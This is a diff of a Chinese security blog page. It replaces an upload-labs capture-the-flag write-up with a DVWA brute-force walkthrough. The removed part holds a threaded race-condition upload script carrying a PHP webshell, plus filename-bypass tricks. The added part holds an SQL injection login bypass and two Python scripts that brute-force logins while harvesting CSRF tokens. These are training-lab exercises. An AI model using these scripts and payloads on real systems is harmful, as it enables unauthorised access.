@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>pass-18~pass-21 |  云芽的博客</title>
+      <title>Brute Force |  云芽的博客</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -66,7 +66,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-upload-labs通关指南/pass-18~pass-21"
+  id="post-DVWA通关指南/Brute-Force"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -77,7 +77,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  pass-18~pass-21
+  Brute Force
 </h1>
  
 
@@ -85,11 +85,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/02/06/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-18~pass-21/" class="article-date">
-  <time datetime="2022-02-06T14:09:34.000Z" itemprop="datePublished">2022-02-06</time>
+      <a href="/2022/02/07/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Brute-Force/" class="article-date">
+  <time datetime="2022-02-07T13:21:26.000Z" itemprop="datePublished">2022-02-07</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/">upload-labs通关指南</a>
+    <a class="article-category-link" href="/categories/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/">DVWA通关指南</a>
   </div>
   
 <div class="word_count">
@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.1k</span>
+            <span class="post-count">2.6k</span>
         </span>
     </span>
 
@@ -106,7 +106,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">5 min</span>
+            <span class="post-count">10 min</span>
         </span>
     </span>
 </div>
@@ -121,137 +121,183 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="upload-labs靶场"><a href="#upload-labs靶场" class="headerlink" title="upload-labs靶场"></a>upload-labs靶场</h3><p>备注：解题方法还未实践且未全理解</p>
-<h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h3><p><strong>解题</strong>：（条件竞争）</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
+  <h3 id="Brute-Force（暴力破解）"><a href="#Brute-Force（暴力破解）" class="headerlink" title="Brute Force（暴力破解）"></a>Brute Force（暴力破解）</h3><p>暴力破解是通过枚举获取管理员的账号和密码，在实际的操作中一般用来破解后台管理系统的登录。</p>
+<p><strong>题目</strong>：</p>
+<img src="/images/image-20220207213119524.png" alt="image-20220207213119524" style="zoom:50%;" />
 
-if(isset($_POST[&#39;submit&#39;]))&#123;
-    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
-    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;
-
-    if(move_uploaded_file($temp_file, $upload_file))&#123;
-        if(in_array($file_ext,$ext_arr))&#123;
-             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
-             rename($upload_file, $img_path);
-             $is_upload = true;
-        &#125;else&#123;
-            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
-            unlink($upload_file);
-        &#125;
-    &#125;else&#123;
-        $msg = &#39;上传出错！&#39;;
-    &#125;
-&#125;
+<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p><strong>解题</strong>：</p>
+<p>方法一：字典爆破</p>
+<p>任意输入username和password用burpsuite进行抓包，右击选择send to intruder后进入界面进行设置</p>
+<p>第一个界面Target，填写网站ip和port，如果是https勾选上选框（一般抓包后不需要额外设置）</p>
+<p>第二个界面Positions ，先说下面的http报文，这里是要选择攻击的位置，把要攻击的字段选中，比如username后面的1就前后用$包起来</p>
+<p>我们这里是对用户登陆页面进行一个暴破，所以这里我们选择Cluster Bomb，分别建立用户的字典和密码的字典</p>
+<p>第三个界面Payloads，设置payload set为2（position数量）和payload type为simple list，导入对应字典，点击start attack进行攻击，最后观察length长度进行判断，长度不同的即为正确的账号和密码</p>
+<p>方法二：sql注入（待理解）</p>
+<pre><code>select * from table where username= and password =
+select password from table where username =
 </code></pre>
-<p>网站允许上传任意文件，然后检查上传文件是否包含webshell，如果包含则删除该文件；网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。</p>
+<p>第一种就直接将用户名和密码作为条件查询是否存在<br>第二种是将输入的用户名查询出密码再进行密码的比较</p>
+<p>本题采用第一种情况即最简单的注入就成功了，但这里要注意的是admin‘ or 1=1 # 并不会成功，这里的username类似主键是唯一的，所以它对查询结果的数目做了检测<code>if(\$result&amp;&amp;mysql_num_rows($result)==1)</code>所以上面的方法至少要加上limit 1，admin‘ or 1=1 limit 1#这样就会成功</p>
+<h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>中等等级的暴力破解和低等级的相同，只是低等级的暴力破解可以进行sql注入，而中等级的把其中的字符串给过滤掉了但是操作相同。需要注意的是中级的暴力破解相对来说较慢是因为有个sleep函数，在破解失败后会使程序停止运行两秒。</p>
+<h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>high级别加入了user_token，每次页面返回数据会给你一个token，下次再去访问的时候必须携带token值才行。</p>
 <p>方法一：</p>
-<p>先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此只需要在文件被删除之前访问即可，可以利用burpsuite的intruder模块不断上传，然后不断访问刷新该地址即可</p>
-<p>方法二：<br>利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。在脚本运行的时候访问webshell。</p>
-<pre><code class="python">#!/usr/bin/env python
-#coding:utf-8
-#Build By LandGrey
-
-import hackhttp
-from multiprocessing.dummy import Pool as ThreadPool
-
-
-def upload(lists):
-    hh = hackhttp.hackhttp()
-    raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/upload-labs/Pass-17/index.php
-Cookie: pass=17
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: multipart/form-data; boundary=---------------------------6696274297634
-Content-Length: 341
-
------------------------------6696274297634
-Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;
-Content-Type: application/octet-stream
-
-&lt;?php assert($_POST[&quot;LandGrey&quot;])?&gt;
------------------------------6696274297634
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-上传
------------------------------6696274297634--
+<p>因为token值是不断变化的所以抓包工具就用不上了，这时候需要自己写脚本</p>
+<p>代码1：</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/89464125">https://blog.csdn.net/qq_26406447/article/details/89464125</a></p>
+<pre><code>&quot;&quot;&quot;
+针对dvwa暴力破解high级别的脚本
 &quot;&quot;&quot;
-    code, head, html, redirect, log = hh.http(&#39;http://127.0.0.1/upload-labs/Pass-17/index.php&#39;, raw=raw)
-    print(str(code) + &quot;\r&quot;)
+
+import urllib.request
+from lxml import etree
 
 
-pool = ThreadPool(10)
-pool.map(upload, range(10000))
-pool.close()
-pool.join()
-</code></pre>
-<h3 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h3><p><strong>解题</strong>：（条件竞争）</p>
-<p>本关需要上传图片马。对文件后缀名做了白名单判断，然后一步步检查文件大小、文件是否存在等等，将文件上传后对其重命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。</p>
-<h3 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h3><p><strong>解题</strong>：（<code>/.</code>绕过/00截断绕过/空格绕过）</p>
-<p>方法一：</p>
-<p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的即最后保存的文件名是可控的，而move_uploaded_file会忽略掉末尾的/.(不和pass-09一样，无PHP版本限制)。因此如下构造：</p>
-<img src="/images/image-20220206230721948.png" alt="image-20220206230721948" style="zoom: 67%;" />
-
-<p>方法二：</p>
-<p>上传webshell发现禁止保存php文件，利用文件名的0x00截断绕过。改成pass19.php【二进制00】，参考pass13</p>
-<h3 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h3><p><strong>解题</strong>：（/ + 数组 绕过）</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if(!empty($_FILES[&#39;upload_file&#39;]))&#123;
-    //检查MIME
-    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
-    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;
-        $msg = &quot;禁止上传该类型文件!&quot;;
-    &#125;else&#123;
-        //检查文件名
-        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
-        if (!is_array($file)) &#123;
-            $file = explode(&#39;.&#39;, strtolower($file));
-            //explode()函数把字符串打散为数组。可以通过传入数组进行绕过。
-        &#125;
-
-        $ext = end($file);
-        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-        if (!in_array($ext, $allow_suffix)) &#123;
-            $msg = &quot;禁止上传该后缀文件!&quot;;
-        &#125;else&#123;
-            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) &#123;
-                $msg = &quot;文件上传成功！&quot;;
-                $is_upload = true;
-            &#125; else &#123;
-                $msg = &quot;文件上传失败！&quot;;
-            &#125;
-        &#125;
-    &#125;
-&#125;else&#123;
-    $msg = &quot;请选择要上传的文件！&quot;;
+header=&#123;
+    &#39;Host&#39;: &#39;192.168.2.205:8331&#39;,
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&#39;,
+    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
+    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
+    &#39;Referer&#39;: &#39;http://192.168.2.205:8331/&#39;,
+    &#39;Connection&#39;: &#39;close&#39;,
+    &#39;Cookie&#39;: &#39;PHPSESSID=teekas77m4bogenehmeuek3m65; security=high&#39;
 &#125;
+
+def get_content(url):
+    global header
+    request = urllib.request.Request(url = url, headers=header)
+    response = urllib.request.urlopen(request).read().decode(&#39;utf-8&#39;)
+    return response
+
+def get_tocken(content):
+    html = etree.HTML(content)
+    result = html.xpath(&#39;//div[contains(@class,&quot;vulnerable_code_area&quot;)]//input[contains(@type,&quot;hidden&quot;)]/@value&#39;)
+    #print(result[0])
+    return result[0]
+
+def judge_flag(content):
+    flag = &#39;Username and/or password incorrect.&#39;
+    if flag in content:
+        return False
+    return True
+
+def main():
+    url =&quot;http://192.168.2.205:8331/vulnerabilities/brute/&quot;
+    tocken = get_tocken(get_content(url))
+
+    with open(&#39;username&#39;, &#39;r&#39;) as un:
+        username = un.readline()
+        while username:
+            with open(&#39;password&#39;, &#39;r&#39;) as pw:
+                password = pw.readline()
+                while password:
+                    url = &quot;http://192.168.2.205:8331/vulnerabilities/brute/?username=&quot; + username.strip() + &quot;&amp;password=&quot; + password.strip() + &quot;&amp;Login=Login&amp;user_token=&quot; + tocken + &quot;#&quot;
+                    #print(url)
+                    content = get_content(url)
+                    if judge_flag(content):
+                        print(&#39;username:%s  password:%s success!!!&#39; %(username.strip(),password.strip()))
+                    tocken = get_tocken(content)
+                    password = pw.readline()
+            username = un.readline()
+
+    print(&#39;over!&#39;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
 </code></pre>
-<p>可以让file为数组 。file[0]为phpinfo.php/，也就是reset(file) ，然后再令file[2]为白名单中的jpg。此时end(file) 等于jpg，file[count($file) - 1]为空。而<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>也就是phpinfo.php/.，最终move_uploaded_file会忽略掉/.，到这里我们就上传成功了</p>
-<img src="/images/image-20220206232217163.png" alt="image-20220206232217163" style="zoom: 67%;" />
+<p>代码2：</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44717303/article/details/116589478">https://blog.csdn.net/weixin_44717303/article/details/116589478</a></p>
+<pre><code class="python">import re
+import requests
 
+header1 = &#123;
+    &quot;Cookie&quot;: &quot;PHPSESSID=493r4rd6h86v0lue5frn1ohdq5; security=high&quot;  # 复制cookie文件
+&#125;
 
+for username in open(&quot;user.txt&quot;):  # 账户
+    for password in open(&#39;pass.txt&#39;): # 密码
+        token = re.findall(&quot;name=&#39;user_token&#39; value=&#39;(.*?)&#39; /&gt;&quot;,
+                           requests.get(&quot;http://192.168.2.25/vulnerabilities/brute/&quot;, headers=header1).text)
 
-
-
-
-
-
-
-
-
+        url = &#39;http://192.168.2.25/vulnerabilities/brute/?username=&#39; + username + &#39;&amp;password=&#39; + password + &#39;&amp;Login=Login&amp;user_token=&#39; + \
+              token[0]
+        url = url.replace(&quot;\n&quot;, &quot;&quot;) #把换行给去掉
+        attack = requests.get(url, headers=header1)
+        print(&#39;Length =&#39;, len(attack.text), end=&quot; &quot;)
+        print(&#39;username =&#39;, username.replace(&quot;\n&quot;, &quot;&quot;), end=&quot; &quot;)
+        print(&#39;password =&#39;, password.replace(&quot;\n&quot;, &quot;&quot;))
+        # print(token)
+</code></pre>
+<p>方法二：</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1670263677551865887&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1670263677551865887&amp;wfr=spider&amp;for=pc</a></p>
+<p>抓包右键send to intrude，选择攻击模式为pitchfock，给要破解的项加上$</p>
+<p>在options选项中找到grep-extact，先点refetch response进行刷新后选定token的值复制</p>
+<p>找到redirections模块设置允许重定向，选择always</p>
+<p>在 Payloads 中，Payload set 1选择Simple list ，将密码字典添加进去；在Payload set 2 中  token 值选择 Recursive grep（递归查询：从response中提取数据 user_token 的，然后去替换我们爆破的值）</p>
+<p>把之前复制的token值粘贴到initial payload for first request方框中即添加初始值</p>
+<p>点击start attack开始爆破，完成后可以对length排序，排在最前面的很可能是正确的密码。还可以进行如下操作快速找到正确的密码：Options–&gt;Grep–&gt;Match–&gt;添加我们需要的字段</p>
+<h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><p>加入账号锁定机制，数次登录失败后账号锁定</p>
+<p><strong>小知识</strong>：</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wayne-tao/p/11130158.html">https://www.cnblogs.com/wayne-tao/p/11130158.html</a></p>
+<p>Attact type有4种类型</p>
+<ol>
+<li><p>Sniper（狙击手模式）</p>
+<p>单一payload和多个position，遍历payload但一次只改变一个position的值</p>
+<p>这个模式会使用单一的payload【就是导入字典的payload】组即依次拿字典去替换其中的一列，比如上面我们选中的username和password。这里会保持其中一个为我们的输入值，而字典替换另一个值。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
+</li>
+<li><p>Battering ram（攻城锤模式）</p>
+<p>单一payload和多个position，遍历payload且两个position相同位置相同数值</p>
+<p>每次用遍历的值替换所有位置（字典有n个值得话就会攻击n次）。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
+</li>
+<li><p>Pitchfork（叉子模式）</p>
+<p>多个payload和多个position，一个position对应一个payload进行各自攻击</p>
+<p>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：上面的username和password就需要两个字典，同时遍历字典，每次从字典取出的值组成一组数据，进行攻击，当其中任一字典遍历完的时候，攻击就结束，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量（攻击次数为最短字典长度）</p>
+</li>
+<li><p>Cluster Bomb（炸弹模式）</p>
+<p>多个payload和多个position，一个position对应一个payload进行组合攻击</p>
+<p>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
+</li>
+</ol>
+<p>payload pyte 是你设置的密码表单的使用方式</p>
+<ol>
+<li><p>simple list：设置指定字符串，或者从多个文件中读取字符串内容</p>
+</li>
+<li><p>runtime file（运行时文件）：设置从指定文件中按行读取payload</p>
+</li>
+<li><p>custom iterator（自定义迭代）：可以在不同占位设置不同的payload，从而组合成多个规则的payload</p>
+</li>
+<li><p>Character substitution（字符串替换）：设置字符替换规则，对内容进行枚举后生成payload</p>
+</li>
+<li><p>Character substitution表示生成字典的数据集</p>
+</li>
+<li><p>Case modification（对字母大小写情况替换）：多种——no change 不变；to lower case 小写；to upper case 大写；to propername 首字母大写其他小写；to ProperName 首字母大写其他不变</p>
+</li>
+<li><p>Recursive grep（递归替换）：用于从服务端提取有效数据的场景，options (grep extract) 中设置正则抽离内容，才能为下一次请求获取数据</p>
+</li>
+<li><p>Illegal Unicode（不合法的编码）：payloads里用指定的不合法Unicode编码替换字符本身，从这些Payload列表里产生出一个或者多个有效负荷。在尝试回避基于模式匹配的输入验证时，这个有效负荷会有用的</p>
+</li>
+<li><p>Character blocks（字符串）：生成指定长度模式的字符，边界测试或者缓冲区溢出</p>
+</li>
+<li><p>Number：根据配置生成数字payload</p>
+</li>
+<li><p>Dates：根据配置生成日期</p>
+</li>
+<li><p>Brute forcer：此类 payload生成包含一个指定字符集，所有排列，特定长度的有效载荷，通常用于枚举字典的生成</p>
+</li>
+<li><p>NullPayloads（空类型）：空字符串 ， 间隔使用 ， 这种负载类型产生的Payload，其值是一个空字符串。在攻击时，需要同样的请求反复被执行，在没有任何修改原始请求的场景下此Payload是非常有用的。它可用于各种攻击，例如cookie的序列分析、应用层Dos、或保活会话令牌是在其它的间歇试验中使用。</p>
+</li>
+<li><p>Character frobber：依次修改指定字符串每个字符位置的值，测试session的有效性</p>
+</li>
+<li><p>Bit flipper：payload 按照 bit 修改</p>
+</li>
+<li><p>Usernamegenerator：用户名生成器</p>
+</li>
+<li><p>ECB block shuffler：测试基于ecb加密模式的 payload</p>
+</li>
+<li><p>Extesion-generated：基于插件生成payload</p>
+</li>
+<li><p>Copy other payload：将其他位置的复制到该位置上</p>
+</li>
+</ol>
  
       <!-- reward -->
       
@@ -322,7 +368,7 @@ if(!empty($_FILES[&#39;upload_file&#39;]))&#123;
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/02/06/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-18~pass-21/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/02/07/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Brute-Force/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -333,19 +379,19 @@ if(!empty($_FILES[&#39;upload_file&#39;]))&#123;
    
   <nav class="article-nav">
     
-      <a href="/2022/02/07/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Brute-Force/" class="article-nav-link">
+      <a href="/2022/02/08/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Command-Injection/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Brute Force
+            Command Injection
           
         </div>
       </a>
     
     
-      <a href="/2022/02/05/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-14~pass-17/" class="article-nav-link">
+      <a href="/2022/02/06/upload-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/pass-18~pass-21/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">pass-14~pass-17</div>
+        <div class="article-nav-title">pass-18~pass-21</div>
       </a>
     
   </nav>
